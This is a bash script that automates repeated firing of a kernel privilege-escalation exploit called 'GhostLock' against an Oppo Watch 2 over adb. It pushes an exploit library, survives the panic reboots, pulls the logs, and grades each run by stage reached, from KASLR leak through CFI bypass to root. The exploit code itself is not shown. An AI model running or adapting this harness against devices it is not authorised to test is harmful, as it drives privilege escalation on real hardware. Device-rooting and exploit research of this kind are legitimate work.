#!/usr/bin/env bash
# Serialized GhostLock fire batch with panic-safe log capture.
#
# Guarantees:
#  - one fire at a time (waits for device to fully return after a panic reboot)
#  - full /data/local/tmp/log_*.txt pulled after every fire (survives panic)
#  - depth classification so we can see how many fires reach pselect vs CFI
#  - early stop the instant a fire reaches the escalation stage (CFI enter) or
#    achieves root, so we can inspect the winning run instead of over-writing it
#
# Usage: bash batch.sh <N> [per_fire_timeout_sec]
set -u
export MSYS_NO_PATHCONV=1
ADB=/c/platform-tools/adb.exe
DT=/data/local/tmp
ARCH=/c/Users/RLG/Documents/oppowatch2-root/GhostLock-OWW212/captures
LOCAL_SO=/c/Users/RLG/Documents/oppowatch2-root/GhostLock-OWW212/exploit/preload.so
N=${1:-16}
FTO=${2:-110}
STATS="$ARCH/batch_stats.txt"

mkdir -p "$ARCH"
: > "$STATS"

wait_for_ready() {
  # poll up to ~180s for adb device + boot_completed
  for k in $(seq 1 60); do
    if $ADB devices 2>/dev/null | grep -qw device; then
      bc=$($ADB shell getprop sys.boot_completed 2>/dev/null | tr -d '\r')
      if [ "$bc" = "1" ]; then
        # give init a moment to settle (avoid firing into a half-ready system)
        sleep 3
        return 0
      fi
    fi
    sleep 3
  done
  return 1
}

battery_level() {
  $ADB shell 'dumpsys battery' 2>/dev/null | tr -d '\r' | grep -oE 'level: [0-9]+' | grep -oE '[0-9]+'
}

classify() {
  local f="$1"
  local d="no-start"
  grep -q 'no-KASLR target' "$f" 2>/dev/null && d="startup"
  grep -q 'PREP leaked_mm=00000000' "$f" 2>/dev/null && d="leak-miss"
  grep -qE 'PREP leaked_mm=[1-9a-f]' "$f" 2>/dev/null && d="leaked"
  grep -q 'PRE-PCFI' "$f" 2>/dev/null && d="pselect"
  grep -q 'CFI enter' "$f" 2>/dev/null && d="CFI-enter"
  grep -q 'CFI pre-read' "$f" 2>/dev/null && d="CFI-preread"
  grep -q 'CFI post-read' "$f" 2>/dev/null && d="CFI-postread"
  grep -q 'CFI post-write' "$f" 2>/dev/null && d="CFI-postwrite"
  grep -q 'llseek-repaired' "$f" 2>/dev/null && d="CFI-llseek"
  grep -q 'CFI pre-leak-base' "$f" 2>/dev/null && d="CFI-leakbase"
  grep -q 'CFI pre-install-root' "$f" 2>/dev/null && d="CFI-install"
  grep -q 'PRW proof' "$f" 2>/dev/null && d="PRW-proof"
  grep -qE 'install_android_root|android root|uid_after=0|root_child_done' "$f" 2>/dev/null && d="ROOT-ATTEMPT"
  echo "$d"
}

echo "=== batch start $(date) N=$N per_fire_timeout=${FTO}s ===" | tee -a "$STATS"

for ((i=1; i<=N; i++)); do
  if ! wait_for_ready; then
    echo "run=$i ABORT: device not ready (check for brick/bootloop)" | tee -a "$STATS"
    break
  fi

  lvl=$(battery_level)
  # safety: if battery ever reports <10 AND not charging, wait
  if [ -n "${lvl:-}" ] && [ "${lvl}" -lt 10 ] 2>/dev/null; then
    echo "run=$i low battery ($lvl%), waiting for charge..." | tee -a "$STATS"
    for k in $(seq 1 40); do
      sleep 15
      lvl=$(battery_level)
      [ -n "${lvl:-}" ] && [ "${lvl}" -ge 20 ] 2>/dev/null && break
    done
  fi

  # push current binary fresh every fire (panic reboot may drop it; idempotent)
  $ADB push "$LOCAL_SO" $DT/preload.so >/dev/null 2>&1
  $ADB shell "rm -f $DT/log_*.txt" 2>/dev/null

  # fire (blocking until kernel panic OR process exit OR FTO timeout)
  timeout $FTO $ADB shell 'sh /data/local/tmp/fire.sh' >"$ARCH/fire_stdout_$i.txt" 2>&1
  rc=$?

  # after a panic the device is rebooting; wait it out
  wait_for_ready

  # pull the panic-safe log
  $ADB shell "cat $DT/log_*.txt 2>/dev/null" 2>/dev/null | tr -d '\r' > "$ARCH/run_$i.log"
  L="$ARCH/run_$i.log"
  d=$(classify "$L")
  pc=$(grep -c 'PRE-PCFI' "$L" 2>/dev/null)
  calls_line=$(grep -oE 'calls=[0-9]+ success=[0-9]+' "$L" 2>/dev/null | tail -1)
  uid=$(timeout 15 $ADB shell id -u 2>/dev/null | tr -d '\r')
  echo "run=$i rc=$rc depth=$d pselect_attempts=$pc $calls_line uid=$uid batt=${lvl:-?}" | tee -a "$STATS"

  # early stop on escalation or root
  case "$d" in
    CFI-enter|CFI-preread|CFI-postread|CFI-postwrite|CFI-llseek|CFI-leakbase|CFI-install|PRW-proof|ROOT-ATTEMPT)
      echo ">>> run=$i REACHED $d — stopping batch to inspect $L" | tee -a "$STATS"
      break
      ;;
  esac
  if [ "$uid" = "0" ]; then
    echo ">>> run=$i uid=0 ROOT — stopping batch" | tee -a "$STATS"
    break
  fi
done

echo "=== batch end $(date) ===" | tee -a "$STATS"
echo "depth tally:" | tee -a "$STATS"
awk '{for(i=1;i<=NF;i++) if($i ~ /^depth=/) print $i}' "$STATS" | sort | uniq -c | tee -a "$STATS"
